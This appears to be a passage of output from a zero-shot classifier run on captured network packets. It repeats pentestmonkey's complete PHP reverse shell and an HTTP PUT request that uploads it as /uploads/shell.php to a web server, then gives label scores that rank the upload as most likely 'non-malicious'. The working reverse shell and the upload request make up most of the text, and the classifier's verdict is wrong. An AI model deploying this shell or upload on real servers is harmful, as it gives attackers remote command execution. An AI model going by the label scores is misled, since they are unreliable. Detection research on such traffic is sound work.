tool.\n//\n// You are encouraged to send comments, improvements or suggestions to\n// me at pentestmonkey@pentestmonkey.net\n//\n// Description\n// -----------\n// This script will make an outbound TCP connection to a hardcoded IP and port.\n// The recipient will be given a shell running as the current user (apache normally).\n//\n// Limitations\n// -----------\n// proc_open and stream_set_blocking require PHP version 4.3+, or 5+\n// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.\n// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.\n//\n// Usage\n// -----\n// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.\n\nset_time_limit (0);\n$VERSION = "1.0";\n$ip = \'192.168.0.154\';  // CHANGE THIS\n$port = 1234;       // CHANGE THIS\n$chunk_size = 1400;\n$write_a = null;\n$error_a = null;\n$shell = \'uname -a; w; id; /bin/sh -i\';\n$daemon = 0;\n$debug = 0;\n\n//\n// Daemonise ourself if possible to avoid zombies later\n//\n\n// pcntl_fork is hardly ever available, but will allow us to daemonise\n// our php process and avoid zombies.  Worth a try...\nif (function_exists(\'pcntl_fork\')) {\n\t// Fork and have the parent process exit\n\t$pid = pcntl_fork();\n\t\n\tif ($pid == -1) {\n\t\tprintit("ERROR: Can\'t fork");\n\t\texit(1);\n\t}\n\t\n\tif ($pid) {\n\t\texit(0);  // Parent exits\n\t}\n\n\t// Make the current process a session leader\n\t// Will only succeed if we forked\n\tif (posix_setsid() == -1) {\n\t\tprintit("Error: Can\'t setsid()");\n\t\texit(1);\n\t}\n\n\t$daemon = 1;\n} else {\n\tprintit("WARNING: Failed to daemonise.  This is quite common and not fatal.");\n}\n\n// Change to a safe directory\nchdir("/");\n\n// Remove any umask we inherited\numask(0);\n\n//\n// Do the reverse shell...\n//\n\n// Open reverse connection\n$sock = fsockopen($ip, $port, $errno, $errstr, 30);\nif (!$sock) {\n\tprintit("$errstr ($errno)");\n\texit(1);\n}\n\n// Spawn shell process\n$descriptorspec = array(\n   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from\n   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to\n   2 => array("pipe", "w")   // stderr is a pipe that the child will write to\n);\n\n$process = proc_open($shell, $descriptorspec, $pipes);\n\nif (!is_resource($process)) {\n\tprintit("ERROR: Can\'t spawn shell");\n\texit(1);\n}\n\n// Set everything to non-blocking\n// Reason: Occsionally reads will block, even though stream_select tells us they won\'t\nstream_set_blocking($pipes[0], 0);\nstream_set_blocking($pipes[1], 0);\nstream_set_blocking($pipes[2], 0);\nstream_set_blocking($sock, 0);\n\nprintit("Successfully opened reverse shell to $ip:$port");\n\nwhile (1) {\n\t// Check for end of TCP connection\n\tif (feof($sock)) {\n\t\tprintit("ERROR: Shell connection terminated");\n\t\tbreak;\n\t}\n\n\t// Check for end of STDOUT\n\tif (feof($pipes[1])) {\n\t\tprintit("ERROR: Shell process terminated");\n\t\tbreak;\n\t}\n\n\t// Wait until a command is end down $sock, or some\n\t// command output is available on STDOUT or STDERR\n\t$read_a = array($sock, $pipes[1], $pipes[2]);\n\t$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);\n\n\t// If we can read from the TCP socket, send\n\t// data to process\'s STDIN\n\tif (in_array($sock, $read_a)) {\n\t\tif ($debug) printit("SOCK READ");\n\t\t$input = fread($sock, $chunk_size);\n\t\tif ($debug) printit("SOCK: $input");\n\t\tfwrite($pipes[0], $input);\n\t}\n\n\t// If we can read from the process\'s STDOUT\n\t// send data down tcp connection\n\tif (in_array($pipes[1], $read_a)) {\n\t\tif ($debug) printit("STDOUT READ");\n\t\t$input = fread($pipes[1], $chunk_size);\n\t\tif ($debug) printit("STDOUT: $input");\n\t\tfwrite($sock, $input);\n\t}\n\n\t// If we can read from the process\'s STDERR\n\t// send data down tcp connection\n\tif (in_array($pipes[2], $read_a)) {\n\t\tif ($debug) printit("STDERR READ");\n\t\t$input = fread($pipes[2], $chunk_size);\n\t\tif ($debug) printit("STDERR: $input");\n\t\tfwrite($sock, $input);\n\t}\n}\n\nfclose($sock);\nfclose($pipes[0]);\nfclose($pipes[1]);\nfclose($pipes[2]);\nproc_close($process);\n\n// Like print, but does nothing if we\'ve daemonised ourself\n// (I can\'t figure out how to redirect STDOUT like a proper daemon)\nfunction printit ($string) {\n\tif (!$daemon) {\n\t\tprint "$string\\n";\n\t}\n}\n\n?> \n\n\n\n' |>>>
    
String processed with result = {'sequence': '\n    As the payload is large, we will split the payload into 8 parts.\n    Here is part 2 of the payload:\n    Protocol: IP\n    Payload: <IP  version=4 ihl=5 tos=0x0 len=5709 id=11188 flags=DF frag=0 ttl=64 proto=tcp chksum=0x7693 src=192.168.0.154 dst=192.168.0.121 |<TCP  sport=44410 dport=http seq=2533302205 ack=3057699580 dataofs=8 reserved=0 flags=PA window=502 chksum=0x98a3 urgptr=0 options=[(\'NOP\', None), (\'NOP\', None), (\'Timestamp\', (975655210, 6176820))] |<Raw  load=\'PUT /uploads/shell.php HTTP/1.1\\r\\nTE: deflate,gzip;q=0.3\\r\\nConnection: TE, close\\r\\nHost: 192.168.0.121:80\\r\\nUser-Agent: dave/v2.01 (perldav)\\r\\nContent-Length: 5495\\r\\n\\r\\n<?php\\n// php-reverse-shell - A Reverse Shell implementation in PHP\\n// Copyright (C) 2007 pentestmonkey@pentestmonkey.net\\n//\\n// This tool may be used for legal purposes only.  Users take full responsibility\\n// for any actions performed using this tool.  The author accepts no liability\\n// for damage caused by this tool.  If these terms are not acceptable to you, then\\n// do not use this tool.\\n//\\n// In all other respects the GPL version 2 applies:\\n//\\n// This program is free software; you can redistribute it and/or modify\\n// it under the terms of the GNU General Public License version 2 as\\n// published by the Free Software Foundation.\\n//\\n// This program is distributed in the hope that it will be useful,\\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\\n// GNU General Public License for more details.\\n//\\n// You should have received a copy of the GNU General Public License along\\n// with this program; if not, write to the Free Software Foundation, Inc.,\\n// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.\\n//\\n// This tool may be used for legal purposes only.  Users take full responsibility\\n// for any actions performed using this tool.  If these terms are not acceptable to\\n// you, then do not use this tool.\\n//\\n// You are encouraged to send comments, improvements or suggestions to\\n// me at pentestmonkey@pentestmonkey.net\\n//\\n// Description\\n// -----------\\n// This script will make an outbound TCP connection to a hardcoded IP and port.\\n// The recipient will be given a shell running as the current user (apache normally).\\n//\\n// Limitations\\n// -----------\\n// proc_open and stream_set_blocking require PHP version 4.3+, or 5+\\n// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.\\n// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.\\n//\\n// Usage\\n// -----\\n// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.\\n\\nset_time_limit (0);\\n$VERSION = "1.0";\\n$ip = \\\'192.168.0.154\\\';  // CHANGE THIS\\n$port = 1234;       // CHANGE THIS\\n$chunk_size = 1400;\\n$write_a = null;\\n$error_a = null;\\n$shell = \\\'uname -a; w; id; /bin/sh -i\\\';\\n$daemon = 0;\\n$debug = 0;\\n\\n//\\n// Daemonise ourself if possible to avoid zombies later\\n//\\n\\n// pcntl_fork is hardly ever available, but will allow us to daemonise\\n// our php process and avoid zombies.  Worth a try...\\nif (function_exists(\\\'pcntl_fork\\\')) {\\n\\t// Fork and have the parent process exit\\n\\t$pid = pcntl_fork();\\n\\t\\n\\tif ($pid == -1) {\\n\\t\\tprintit("ERROR: Can\\\'t fork");\\n\\t\\texit(1);\\n\\t}\\n\\t\\n\\tif ($pid) {\\n\\t\\texit(0);  // Parent exits\\n\\t}\\n\\n\\t// Make the current process a session leader\\n\\t// Will only succeed if we forked\\n\\tif (posix_setsid() == -1) {\\n\\t\\tprintit("Error: Can\\\'t setsid()");\\n\\t\\texit(1);\\n\\t}\\n\\n\\t$daemon = 1;\\n} else {\\n\\tprintit("WARNING: Failed to daemonise.  This is quite common and not fatal.");\\n}\\n\\n// Change to a safe directory\\nchdir("/");\\n\\n// Remove any umask we inherited\\numask(0);\\n\\n//\\n// Do the reverse shell...\\n//\\n\\n// Open reverse connection\\n$sock = fsockopen($ip, $port, $errno, $errstr, 30);\\nif (!$sock) {\\n\\tprintit("$errstr ($errno)");\\n\\texit(1);\\n}\\n\\n// Spawn shell process\\n$descriptorspec = array(\\n   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from\\n   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to\\n   2 => array("pipe", "w")   // stderr is a pipe that the child will write to\\n);\\n\\n$process = proc_open($shell, $descriptorspec, $pipes);\\n\\nif (!is_resource($process)) {\\n\\tprintit("ERROR: Can\\\'t spawn shell");\\n\\texit(1);\\n}\\n\\n// Set everything to non-blocking\\n// Reason: Occsionally reads will block, even though stream_select tells us they won\\\'t\\nstream_set_blocking($pipes[0], 0);\\nstream_set_blocking($pipes[1], 0);\\nstream_set_blocking($pipes[2], 0);\\nstream_set_blocking($sock, 0);\\n\\nprintit("Successfully opened reverse shell to $ip:$port");\\n\\nwhile (1) {\\n\\t// Check for end of TCP connection\\n\\tif (feof($sock)) {\\n\\t\\tprintit("ERROR: Shell connection terminated");\\n\\t\\tbreak;\\n\\t}\\n\\n\\t// Check for end of STDOUT\\n\\tif (feof($pipes[1])) {\\n\\t\\tprintit("ERROR: Shell process terminated");\\n\\t\\tbreak;\\n\\t}\\n\\n\\t// Wait until a command is end down $sock, or some\\n\\t// command output is available on STDOUT or STDERR\\n\\t$read_a = array($sock, $pipes[1], $pipes[2]);\\n\\t$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);\\n\\n\\t// If we can read from the TCP socket, send\\n\\t// data to process\\\'s STDIN\\n\\tif (in_array($sock, $read_a)) {\\n\\t\\tif ($debug) printit("SOCK READ");\\n\\t\\t$input = fread($sock, $chunk_size);\\n\\t\\tif ($debug) printit("SOCK: $input");\\n\\t\\tfwrite($pipes[0], $input);\\n\\t}\\n\\n\\t// If we can read from the process\\\'s STDOUT\\n\\t// send data down tcp connection\\n\\tif (in_array($pipes[1], $read_a)) {\\n\\t\\tif ($debug) printit("STDOUT READ");\\n\\t\\t$input = fread($pipes[1], $chunk_size);\\n\\t\\tif ($debug) printit("STDOUT: $input");\\n\\t\\tfwrite($sock, $input);\\n\\t}\\n\\n\\t// If we can read from the process\\\'s STDERR\\n\\t// send data down tcp connection\\n\\tif (in_array($pipes[2], $read_a)) {\\n\\t\\tif ($debug) printit("STDERR READ");\\n\\t\\t$input = fread($pipes[2], $chunk_size);\\n\\t\\tif ($debug) printit("STDERR: $input");\\n\\t\\tfwrite($sock, $input);\\n\\t}\\n}\\n\\nfclose($sock);\\nfclose($pipes[0]);\\nfclose($pipes[1]);\\nfclose($pipes[2]);\\nproc_close($process);\\n\\n// Like print, but does nothing if we\\\'ve daemonised ourself\\n// (I can\\\'t figure out how to redirect STDOUT like a proper daemon)\\nfunction printit ($string) {\\n\\tif (!$daemon) {\\n\\t\\tprint "$string\\\\n";\\n\\t}\\n}\\n\\n?> \\n\\n\\n\\n\' |>>>\n    ', 'labels': ['non-malicious', 'normal', 'attack', 'malicious'], 'scores': [0.3107943534851074, 0.28403720259666443, 0.2121015191078186, 0.19306689500808716]}
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Input:

